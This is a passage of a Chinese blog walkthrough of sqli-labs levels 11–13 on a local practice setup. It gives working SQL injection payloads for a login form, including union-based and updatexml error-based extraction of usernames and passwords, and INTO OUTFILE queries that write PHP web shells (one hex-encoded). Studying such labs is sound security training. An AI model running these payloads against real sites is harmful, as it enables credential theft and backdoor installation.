&lt;/span>&lt;span class="lnt">2
&lt;/span>&lt;span class="lnt">3
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-php" data-lang="php">&lt;span class="line">&lt;span class="cl">&lt;span class="nx">uname&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="nx">admin&lt;/span>&lt;span class="s1">&amp;#39; order by 3 %23 &amp;amp;passwd=&amp;amp;submit=Submit //报错
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="s1">uname=admin&amp;#39;&lt;/span> &lt;span class="nx">order&lt;/span> &lt;span class="nx">by&lt;/span> &lt;span class="mi">2&lt;/span> &lt;span class="o">%&lt;/span>&lt;span class="mi">23&lt;/span> &lt;span class="o">&amp;amp;&lt;/span>&lt;span class="nx">passwd&lt;/span>&lt;span class="o">=&amp;amp;&lt;/span>&lt;span class="nx">submit&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="nx">Submit&lt;/span> &lt;span class="c1">//正常
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1">&lt;/span>&lt;span class="nx">说明有两个字段&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>&lt;img src="https://blogslimer.oss-cn-shanghai.aliyuncs.com/blog/Pasted%20image%2020250317144707.png" alt="Pasted image 20250317144707">&lt;br>
&lt;strong>查找回显位：&lt;/strong>&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-php" data-lang="php">&lt;span class="line">&lt;span class="cl">&lt;span class="nx">uname&lt;/span>&lt;span class="o">=-&lt;/span>&lt;span class="nx">admin&lt;/span>&lt;span class="err">&amp;#39;&lt;/span> &lt;span class="nx">union&lt;/span> &lt;span class="nx">select&lt;/span> &lt;span class="mi">1&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="mi">2&lt;/span> &lt;span class="o">%&lt;/span>&lt;span class="mi">23&lt;/span> &lt;span class="o">&amp;amp;&lt;/span>&lt;span class="nx">passwd&lt;/span>&lt;span class="o">=&amp;amp;&lt;/span>&lt;span class="nx">submit&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="nx">Submit&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>&lt;img src="https://blogslimer.oss-cn-shanghai.aliyuncs.com/blog/Pasted%20image%2020250317145213.png" alt="Pasted image 20250317145213">&lt;br>
&lt;strong>爆库名：&lt;/strong>&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-php" data-lang="php">&lt;span class="line">&lt;span class="cl">&lt;span class="nx">uname&lt;/span>&lt;span class="o">=-&lt;/span>&lt;span class="nx">admin&lt;/span>&lt;span class="err">&amp;#39;&lt;/span> &lt;span class="nx">union&lt;/span> &lt;span class="nx">select&lt;/span> &lt;span class="mi">1&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="nx">group_concat&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nx">table_name&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="nx">from&lt;/span> &lt;span class="nx">information_schema&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="nx">tables&lt;/span> &lt;span class="nx">where&lt;/span> &lt;span class="nx">table_schema&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="nx">database&lt;/span>&lt;span class="p">()&lt;/span> &lt;span class="o">%&lt;/span>&lt;span class="mi">23&lt;/span> &lt;span class="o">&amp;amp;&lt;/span>&lt;span class="nx">passwd&lt;/span>&lt;span class="o">=&amp;amp;&lt;/span>&lt;span class="nx">submit&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="nx">Submit&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>&lt;img src="https://blogslimer.oss-cn-shanghai.aliyuncs.com/blog/Pasted%20image%2020250317145013.png" alt="Pasted image 20250317145013">&lt;br>
&lt;strong>爆表名：&lt;/strong>&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-php" data-lang="php">&lt;span class="line">&lt;span class="cl">&lt;span class="nx">uname&lt;/span>&lt;span class="o">=-&lt;/span>&lt;span class="nx">admin&lt;/span>&lt;span class="err">&amp;#39;&lt;/span> &lt;span class="nx">union&lt;/span> &lt;span class="nx">select&lt;/span> &lt;span class="mi">1&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="nx">group_concat&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nx">table_name&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="nx">from&lt;/span> &lt;span class="nx">information_schema&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="nx">tables&lt;/span> &lt;span class="nx">where&lt;/span> &lt;span class="nx">table_schema&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="nx">database&lt;/span>&lt;span class="p">()&lt;/span> &lt;span class="o">%&lt;/span>&lt;span class="mi">23&lt;/span> &lt;span class="o">&amp;amp;&lt;/span>&lt;span class="nx">passwd&lt;/span>&lt;span class="o">=&amp;amp;&lt;/span>&lt;span class="nx">submit&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="nx">Submit&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>&lt;img src="https://blogslimer.oss-cn-shanghai.aliyuncs.com/blog/Pasted%20image%2020250317145312.png" alt="Pasted image 20250317145312">&lt;br>
&lt;strong>爆列名：&lt;/strong>&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-php" data-lang="php">&lt;span class="line">&lt;span class="cl">&lt;span class="nx">uname&lt;/span>&lt;span class="o">=-&lt;/span>&lt;span class="nx">admin&lt;/span>&lt;span class="s1">&amp;#39; union select 1,group_concat(column_name) from information_schema.columns where table_name=&amp;#39;&lt;/span>&lt;span class="nx">emails&lt;/span>&lt;span class="err">&amp;#39;&lt;/span> &lt;span class="o">%&lt;/span>&lt;span class="mi">23&lt;/span> &lt;span class="o">&amp;amp;&lt;/span>&lt;span class="nx">passwd&lt;/span>&lt;span class="o">=&amp;amp;&lt;/span>&lt;span class="nx">submit&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="nx">Submit&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>&lt;img src="https://blogslimer.oss-cn-shanghai.aliyuncs.com/blog/Pasted%20image%2020250317145416.png" alt="Pasted image 20250317145416">&lt;br>
&lt;strong>爆信息：&lt;/strong>&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-php" data-lang="php">&lt;span class="line">&lt;span class="cl">&lt;span class="nx">uname&lt;/span>&lt;span class="o">=-&lt;/span>&lt;span class="nx">admin&lt;/span>&lt;span class="s1">&amp;#39; union select 1,group_concat(concat_ws(&amp;#39;&lt;/span>&lt;span class="o">-&lt;/span>&lt;span class="err">&amp;#39;&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="nx">id&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="nx">email_id&lt;/span>&lt;span class="p">))&lt;/span> &lt;span class="nx">from&lt;/span> &lt;span class="nx">emails&lt;/span> &lt;span class="o">%&lt;/span>&lt;span class="mi">23&lt;/span> &lt;span class="o">&amp;amp;&lt;/span>&lt;span class="nx">passwd&lt;/span>&lt;span class="o">=&amp;amp;&lt;/span>&lt;span class="nx">submit&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="nx">Submit&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>&lt;img src="https://blogslimer.oss-cn-shanghai.aliyuncs.com/blog/Pasted%20image%2020250317145535.png" alt="Pasted image 20250317145535">&lt;br>
&lt;strong>写shell：&lt;/strong>&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-php" data-lang="php">&lt;span class="line">&lt;span class="cl">&lt;span class="nx">uname&lt;/span>&lt;span class="o">=-&lt;/span>&lt;span class="nx">admin&lt;/span>&lt;span class="s1">&amp;#39; UNION SELECT 1,&amp;#39;&lt;/span>&lt;span class="o">&amp;lt;?&lt;/span>&lt;span class="nx">php&lt;/span> &lt;span class="o">@&lt;/span>&lt;span class="k">eval&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nv">$_POST&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="s2">&amp;#34;v&amp;#34;&lt;/span>&lt;span class="p">]);&lt;/span>&lt;span class="cp">?&amp;gt;&lt;/span>&lt;span class="err">&amp;#39; into outfile &amp;#34;D:\\phpStudy_pro\\WWW\\hack1.php&amp;#34; %23 &amp;amp;passwd=&amp;amp;submit=Submit
&lt;/span>&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>&lt;img src="https://blogslimer.oss-cn-shanghai.aliyuncs.com/blog/Pasted%20image%2020250317145849.png" alt="Pasted image 20250317145849">&lt;br>
&lt;strong>成功连接&lt;/strong>&lt;br>
&lt;img src="https://blogslimer.oss-cn-shanghai.aliyuncs.com/blog/Pasted%20image%2020250317145917.png" alt="Pasted image 20250317145917">&lt;/p>
&lt;h1 id="less-12">Less-12&lt;/h1>
&lt;p>跟11关差不多，但是使用的是&lt;strong>双引号加括号&lt;/strong>进行闭合。&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-fallback" data-lang="fallback">&lt;span class="line">&lt;span class="cl">uname=admin&amp;#34;) order by 2 --+&amp;amp;passwd=&amp;amp;submit=Submit
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>&lt;img src="https://blogslimer.oss-cn-shanghai.aliyuncs.com/blog/Pasted%20image%2020250317151040.png" alt="Pasted image 20250317151040">&lt;br>
然后后面跟11关一样。&lt;/p>
&lt;h1 id="less-13">Less-13&lt;/h1>
&lt;p>基于&lt;strong>单引号加括号&lt;/strong>进行闭合，错误回显注入。和十二关一样。&lt;br>
构建payload:&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-php" data-lang="php">&lt;span class="line">&lt;span class="cl">&lt;span class="nx">uname&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="nx">admin&lt;/span>&lt;span class="err">&amp;#39;&lt;/span>&lt;span class="o">&amp;amp;&lt;/span>&lt;span class="nx">passwd&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="nx">pass&lt;/span>&lt;span class="o">&amp;amp;&lt;/span>&lt;span class="nx">submit&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="nx">Submit&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>&lt;img src="https://blogslimer.oss-cn-shanghai.aliyuncs.com/blog/Pasted%20image%2020250324141135.png" alt="Pasted image 20250324141135">&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-fallback" data-lang="fallback">&lt;span class="line">&lt;span class="cl">从返回结果（sql语法问题）可见本关的闭合是&amp;#39;)
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>使用&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;span class="lnt">2
&lt;/span>&lt;span class="lnt">3
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-php" data-lang="php">&lt;span class="line">&lt;span class="cl">&lt;span class="nx">uname&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="nx">admin&lt;/span>&lt;span class="s1">&amp;#39;) order by 2 --+&amp;amp;passwd=pass&amp;amp;submit=Submit
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="s1">uname=admin&amp;#39;&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="nx">order&lt;/span> &lt;span class="nx">by&lt;/span> &lt;span class="mi">3&lt;/span> &lt;span class="o">--+&amp;amp;&lt;/span>&lt;span class="nx">passwd&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="nx">pass&lt;/span>&lt;span class="o">&amp;amp;&lt;/span>&lt;span class="nx">submit&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="nx">Submit&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nx">进行测试，发现可知查询结果有两列&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>&lt;img src="https://blogslimer.oss-cn-shanghai.aliyuncs.com/blog/Pasted%20image%2020250324141332.png" alt="Pasted image 20250324141332">&lt;br>
&lt;img src="https://blogslimer.oss-cn-shanghai.aliyuncs.com/blog/Pasted%20image%2020250324141349.png" alt="Pasted image 20250324141349">&lt;br>
使用union进行查询，发现没有回显。&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-php" data-lang="php">&lt;span class="line">&lt;span class="cl">&lt;span class="nx">uname&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="nx">admin&lt;/span>&lt;span class="err">&amp;#39;&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="nx">union&lt;/span> &lt;span class="nx">select&lt;/span> &lt;span class="mi">1&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="mi">2&lt;/span> &lt;span class="o">--+&amp;amp;&lt;/span>&lt;span class="nx">passwd&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="nx">pass&lt;/span>&lt;span class="o">&amp;amp;&lt;/span>&lt;span class="nx">submit&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="nx">Submit&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>&lt;img src="https://blogslimer.oss-cn-shanghai.aliyuncs.com/blog/Pasted%20image%2020250324141550.png" alt="Pasted image 20250324141550">&lt;br>
看来这关要用报错注入了&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt"> 1
&lt;/span>&lt;span class="lnt"> 2
&lt;/span>&lt;span class="lnt"> 3
&lt;/span>&lt;span class="lnt"> 4
&lt;/span>&lt;span class="lnt"> 5
&lt;/span>&lt;span class="lnt"> 6
&lt;/span>&lt;span class="lnt"> 7
&lt;/span>&lt;span class="lnt"> 8
&lt;/span>&lt;span class="lnt"> 9
&lt;/span>&lt;span class="lnt">10
&lt;/span>&lt;span class="lnt">11
&lt;/span>&lt;span class="lnt">12
&lt;/span>&lt;span class="lnt">13
&lt;/span>&lt;span class="lnt">14
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-php" data-lang="php">&lt;span class="line">&lt;span class="cl">&lt;span class="c1">#获取服务器上所有数据库的名称
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1">&lt;/span>&lt;span class="nx">uname&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="nx">ele&lt;/span>&lt;span class="s1">&amp;#39;) and updatexml(1,concat(0x7e,substr((select group_concat(schema_name) from information_schema.schemata),1,31),0x7e),1)#&amp;amp;passwd=pass&amp;amp;submit=Submit
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="s1">uname=ele&amp;#39;&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="k">and&lt;/span> &lt;span class="nx">updatexml&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="mi">1&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="nx">concat&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="mh">0x7e&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="nx">substr&lt;/span>&lt;span class="p">((&lt;/span>&lt;span class="nx">select&lt;/span> &lt;span class="nx">group_concat&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nx">schema_name&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="nx">from&lt;/span> &lt;span class="nx">information_schema&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="nx">schemata&lt;/span>&lt;span class="p">),&lt;/span>&lt;span class="mi">32&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="mi">31&lt;/span>&lt;span class="p">),&lt;/span>&lt;span class="mh">0x7e&lt;/span>&lt;span class="p">),&lt;/span>&lt;span class="mi">1&lt;/span>&lt;span class="p">)&lt;/span>&lt;span class="c1">#&amp;amp;passwd=pass&amp;amp;submit=Submit
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1">&lt;/span>&lt;span class="nx">uname&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="nx">ele&lt;/span>&lt;span class="s1">&amp;#39;) and updatexml(1,concat(0x7e,substr((select group_concat(schema_name) from information_schema.schemata),63,31),0x7e),1)#&amp;amp;passwd=pass&amp;amp;submit=Submit
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="s1">#获取pikachu数据库的所有表名称
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="s1">uname=ele&amp;#39;&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="k">and&lt;/span> &lt;span class="nx">updatexml&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="mi">1&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="nx">concat&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="mh">0x7e&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="nx">substr&lt;/span>&lt;span class="p">((&lt;/span>&lt;span class="nx">select&lt;/span> &lt;span class="nx">group_concat&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nx">table_name&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="nx">from&lt;/span> &lt;span class="nx">information_schema&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="nx">tables&lt;/span> &lt;span class="nx">where&lt;/span> &lt;span class="nx">table_schema&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="s1">&amp;#39;pikachu&amp;#39;&lt;/span>&lt;span class="p">),&lt;/span>&lt;span class="mi">1&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="mi">31&lt;/span>&lt;span class="p">),&lt;/span>&lt;span class="mh">0x7e&lt;/span>&lt;span class="p">),&lt;/span>&lt;span class="mi">1&lt;/span>&lt;span class="p">)&lt;/span>&lt;span class="c1">#&amp;amp;passwd=pass&amp;amp;submit=Submit
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1">&lt;/span>&lt;span class="nx">uname&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="nx">ele&lt;/span>&lt;span class="s1">&amp;#39;) and updatexml(1,concat(0x7e,substr((select group_concat(table_name) from information_schema.tables where table_schema=&amp;#39;&lt;/span>&lt;span class="nx">pikachu&lt;/span>&lt;span class="s1">&amp;#39;),32,31),0x7e),1)#&amp;amp;passwd=pass&amp;amp;submit=Submit
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="s1">#获取pikachu数据库users表的所有列名称
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="s1">uname=ele&amp;#39;&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="k">and&lt;/span> &lt;span class="nx">updatexml&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="mi">1&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="nx">concat&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="mh">0x7e&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="nx">substr&lt;/span>&lt;span class="p">((&lt;/span>&lt;span class="nx">select&lt;/span> &lt;span class="nx">group_concat&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nx">column_name&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="nx">from&lt;/span> &lt;span class="nx">information_schema&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="nx">columns&lt;/span> &lt;span class="nx">where&lt;/span> &lt;span class="nx">table_schema&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="s1">&amp;#39;pikachu&amp;#39;&lt;/span> &lt;span class="k">and&lt;/span> &lt;span class="nx">table_name&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="s1">&amp;#39;users&amp;#39;&lt;/span>&lt;span class="p">),&lt;/span>&lt;span class="mi">1&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="mi">31&lt;/span>&lt;span class="p">),&lt;/span>&lt;span class="mh">0x7e&lt;/span>&lt;span class="p">),&lt;/span>&lt;span class="mi">1&lt;/span>&lt;span class="p">)&lt;/span>&lt;span class="c1">#&amp;amp;passwd=pass&amp;amp;submit=Submit
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1">#获取pikachu数据库users表的username和password列的所有值
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1">&lt;/span>&lt;span class="nx">uname&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="nx">ele&lt;/span>&lt;span class="s1">&amp;#39;) and updatexml(1,concat(0x7e,substr((select group_concat(concat(username,&amp;#39;&lt;/span>&lt;span class="o">^&lt;/span>&lt;span class="s1">&amp;#39;,password)) from pikachu.users),1,31),0x7e),1)#&amp;amp;passwd=pass&amp;amp;submit=Submit
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="s1">uname=ele&amp;#39;&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="k">and&lt;/span> &lt;span class="nx">updatexml&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="mi">1&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="nx">concat&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="mh">0x7e&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="nx">substr&lt;/span>&lt;span class="p">((&lt;/span>&lt;span class="nx">select&lt;/span> &lt;span class="nx">group_concat&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nx">concat&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nx">username&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="s1">&amp;#39;^&amp;#39;&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="nx">password&lt;/span>&lt;span class="p">))&lt;/span> &lt;span class="nx">from&lt;/span> &lt;span class="nx">pikachu&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="nx">users&lt;/span>&lt;span class="p">),&lt;/span>&lt;span class="mi">32&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="mi">31&lt;/span>&lt;span class="p">),&lt;/span>&lt;span class="mh">0x7e&lt;/span>&lt;span class="p">),&lt;/span>&lt;span class="mi">1&lt;/span>&lt;span class="p">)&lt;/span>&lt;span class="c1">#&amp;amp;passwd=pass&amp;amp;submit=Submit
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1">&lt;/span>&lt;span class="nx">uname&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="nx">ele&lt;/span>&lt;span class="s1">&amp;#39;) and updatexml(1,concat(0x7e,substr((select group_concat(concat(username,&amp;#39;&lt;/span>&lt;span class="o">^&lt;/span>&lt;span class="s1">&amp;#39;,password)) from pikachu.users),63,31),0x7e),1)#&amp;amp;passwd=pass&amp;amp;submit=Submit
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="s1">uname=ele&amp;#39;&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="k">and&lt;/span> &lt;span class="nx">updatexml&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="mi">1&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="nx">concat&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="mh">0x7e&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="nx">substr&lt;/span>&lt;span class="p">((&lt;/span>&lt;span class="nx">select&lt;/span> &lt;span class="nx">group_concat&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nx">concat&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nx">username&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="s1">&amp;#39;^&amp;#39;&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="nx">password&lt;/span>&lt;span class="p">))&lt;/span> &lt;span class="nx">from&lt;/span> &lt;span class="nx">pikachu&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="nx">users&lt;/span>&lt;span class="p">),&lt;/span>&lt;span class="mi">94&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="mi">31&lt;/span>&lt;span class="p">),&lt;/span>&lt;span class="mh">0x7e&lt;/span>&lt;span class="p">),&lt;/span>&lt;span class="mi">1&lt;/span>&lt;span class="p">)&lt;/span>&lt;span class="c1">#&amp;amp;passwd=pass&amp;amp;submit=Submit
&lt;/span>&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>写webshell的payload:&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-fallback" data-lang="fallback">&lt;span class="line">&lt;span class="cl">uname=ele&amp;#39;) or 1=1 limit 0,1 into outfile &amp;#39;C:/less13.php&amp;#39; lines terminated by 0x3c3f7068702061737365727428245f504f53545b6c65737331335d293b3f3e#&amp;amp;passwd=pass&amp;amp;submit=Submit
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>&lt;img src="https://blogslimer.oss-cn-shanghai.aliyuncs.com/blog/Pasted%20image%2020250324141817.png" alt="Pasted image 20250324141817">&lt;/p>
